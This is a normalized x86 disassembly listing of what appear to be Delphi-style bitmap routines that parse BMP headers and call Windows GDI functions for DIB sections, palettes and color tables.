sub ecx 0x4
mov edx [ ebp - 0x1c ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x24 ]
sub [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x10 ] 0x3
je r-xdata
lea edx [ ebp - 0x54 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x40 ]
xor ecx ecx
mov edx 0x28
call sub_44bd90
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp - 0x50 ]
mov edx [ ebp - 0x44 ]
mov [ edx + 0x4 ] eax
movzx eax [ ebp - 0x4e ]
mov edx [ ebp - 0x44 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x44 ]
mov dx [ ebp - 0x4c ]
mov [ eax + 0xc ] dx
mov eax [ ebp - 0x44 ]
mov dx [ ebp - 0x4a ]
mov [ eax + 0xe ] dx
sub [ ebp - 0xc ] 0xc
jmp r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov edx [ ebp - 0x24 ]
mov [ eax ] edx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x48 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x28
jne r-xdata
call sub_410048
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x3c ] eax
lea edx [ ebp - 0x24 ]
mov ecx 0x4
mov eax [ ebp - 0x3c ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ecx [ ebp - 0x24 ]
sub ecx 0x4
mov edx [ ebp - 0x1c ]
add edx 0x4
mov eax [ ebp - 0x3c ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x3c ]
call sub_43eba8
mov edx [ ebp - 0xc ]
neg edx
mov cx 0x2
mov eax [ ebp - 0x3c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x48 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
cmp [ eax + 0xe ] 0x10
je r-xdata
mov eax [ ebp - 0x48 ]
mov ecx [ eax + 0x20 ]
xor eax eax
mov al [ ebp - 0x25 ]
movzx eax [ eax + rw-data ]
imul ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_43eb18
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x20 ]
xor edx edx
mov dl [ ebp - 0x25 ]
movzx edx [ edx + rw-data ]
imul edx
sub [ ebp - 0xc ] eax
mov eax [ ebp - 0x48 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
mov ax [ eax + 0xe ]
call sub_4102fc
mov edx [ ebp - 0x48 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x48 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x48 ]
cmp [ eax + 0xe ] 0x20
jne r-xdata
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp - 0x48 ]
movzx edx [ eax + 0xe ]
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_410338
mov ecx eax
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov eax [ ebp - 0x48 ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp - 0x20 ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_43eb18
add [ ebp - 0x20 ] 0xc
sub [ ebp - 0xc ] 0xc
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
push 0x0
call GetDC
call sub_41016c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4158dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_410644
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBSection
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
call sub_44ba5c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415844
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43eb18
mov eax [ ebp - 0x10 ]
push eax
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x14 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0x10 ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_415818
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x4
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
xor eax eax
call sub_410990
mov [ ebp - 0x34 ] eax
push 0x0
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectPalette
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x14 ]
push eax
call RealizePalette
call sub_448c18
call sub_410048
jmp r-xdata
xor eax eax
push ebp
push sub_4158ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43eb18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41581f
cmp [ ebp - 0x38 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158e4
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectPalette
call sub_448c18
call sub_410048
jmp r-xdata
sub_41581f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_44ba74
retn
mov eax [ ebp - 0x14 ]
push eax
call DeleteDC
sub_4158e4
mov eax [ ebp - 0x40 ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0xa8 ]
xor ecx ecx
mov edx 0x54
call sub_44bd90
lea eax [ ebp - 0xa8 ]
push eax
push 0x54
mov eax [ ebp - 0x2c ]
push eax
call GetObjectA
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_415979
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
xor eax eax
call sub_410990
mov [ ebp - 0x34 ] eax
sub_415996
lea eax [ ebp - 0xa8 ]
push eax
mov al [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_415324
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4159d8
push ebp
mov ebp esp
add esp 0xffffff90
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_415070
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea edx [ ebp - 0x1a ]
mov ecx 0xe
mov eax [ ebp - 0x8 ]
call sub_43eb18
cmp [ ebp - 0x1a ] 0x4d42
je r-xdata
lea eax [ ebp - 0x6e ]
xor ecx ecx
mov edx 0x54
call sub_44bd90
lea eax [ ebp - 0x6e ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_415324
jmp r-xdata
mov ecx [ ebp - 0xc ]
sub ecx 0xe
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415460
call sub_410048
mov esp ebp
pop ebp
retn
sub_415a4c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_415070
lea eax [ ebp - 0x64 ]
xor ecx ecx
mov edx 0x54
call sub_44bd90
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x64 ]
push eax
push 0x54
mov eax [ ebp - 0x8 ]
push eax
call GetObjectA
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax + 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
call sub_4142e4
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_415b0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_415b38
push ebp
mov ebp esp
add esp 0xffffff94
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414cc4
cmp al [ ebp - 0x5 ]
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
call sub_41514c
mov eax [ ebp - 0x18 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x6c ]
mov ecx 0x15
[ edi ] [ esi ]
xor eax eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
sete [ ebp - 0x11 ]
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x18 ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
call sub_41514c
mov eax [ ebp - 0x4 ]
call sub_414f9c
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x18 ]
cmp eax [ edx + 0x8 ]
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax + 0x30 ] 0x28
jmp r-xdata
mov eax [ ebp - 0x18 ]
xor edx edx
mov [ eax + 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x10 ]
call sub_4142e4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x18
push eax
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_414754
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x18
push eax
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_415324
jmp r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_415324
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x6c ]
push eax
push 0x0
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
call sub_413c7c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_415d04
push ebp
mov ebp esp
add esp 0xffffffa0
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x60 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414754
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_415d74
push ebp
mov ebp esp
add esp 0xffffff9c
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x30
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp al [ ebp - 0x5 ]
je r-xdata
mov al 0x1
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x64 ]
mov ecx 0x15
[ edi ] [ esi ]
xor eax eax
mov [ ebp - 0x4c ] eax
xor eax eax
mov al [ ebp - 0x5 ]
mov [ ebp - 0x40 ] ax
xor eax eax
mov al [ ebp - 0x5 ]
mov [ ebp - 0x3e ] ax
xor eax eax
mov al [ ebp - 0x5 ]
mov [ ebp - 0x54 ] ax
xor eax eax
mov al [ ebp - 0x5 ]
mov [ ebp - 0x52 ] ax
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414754
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_415e20
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0x10 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x64 ]
mov ecx 0x15
[ edi ] [ esi ]
lea eax [ ebp - 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_413c7c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415ee1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_415324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
lea ecx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_413b3c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
call sub_40db50
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax + 0x10 ] edx
jmp r-xdata
sub_415ee6
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
call sub_44c7c4
call sub_44c818
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
lea ecx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_413b3c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415f2c
push ebp
mov ebp esp
add esp 0xffffff98
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414dc4
cmp al [ ebp - 0x5 ]
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_410028
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x65 ]
xor ecx ecx
mov edx 0x54
call sub_44bd90
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x65 ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x11 ] 0x0
xor eax eax
mov [ ebp - 0x51 ] eax
mov [ ebp - 0x4d ] 0x28
mov eax [ ebp - 0x61 ]
mov [ ebp - 0x49 ] eax
mov eax [ ebp - 0x5d ]
mov [ ebp - 0x45 ] eax
mov [ ebp - 0x41 ] 0x1
xor eax eax
mov al [ ebp - 0x5 ]
movzx eax [ eax + rw-data ]
mov [ ebp - 0x3f ] ax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
mov al [ ebp - 0x5 ]
sub al 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
xor eax eax
push ebp
push sub_41608a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x65 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x60 ]
mov edx eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_414754
cmp [ ebp - 0xc ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41016c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call CreateHalftonePalette
mov [ ebp - 0xc ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
jmp r-xdata
sub al 0x2
je r-xdata
retn
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
mov [ ebp - 0x3d ] 0x3
mov [ ebp - 0x25 ] 0xf800
mov [ ebp - 0x21 ] 0x7e0
mov [ ebp - 0x1d ] 0x1f
jmp r-xdata
sub_4160a4
push ebp
mov ebp esp
add esp 0xffffffa0
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x60 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414754
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_416114
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416134
pop ecx
pop ecx
pop ebp
retn
sub_416134
push ebp
mov ebp esp
add esp 0xfffffbc0
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x32 ]
xor ecx ecx
mov edx 0xe
call sub_44bd90
mov [ ebp - 0x32 ] 0x4d42
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414f9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x6c ]
call sub_43eac4
add eax 0xe
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x50 ]
push eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x14 ]
call sub_411230
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
lea edx [ ebp - 0x32 ]
mov ecx 0xe
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x6c ]
call sub_43eac4
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_43eb60
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov eax [ ebp - 0x18 ]
add eax 0xe
add [ ebp - 0x10 ] eax
lea eax [ ebp - 0x32 ]
xor ecx ecx
mov edx 0xe
call sub_44bd90
mov [ ebp - 0x32 ] 0x4d42
mov eax [ ebp - 0x4 ]
call sub_414c24
mov dl [ r-xdata ]
call sub_40fd6c
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41016c
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x43e ]
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x50 ] 0x0
jbe r-xdata
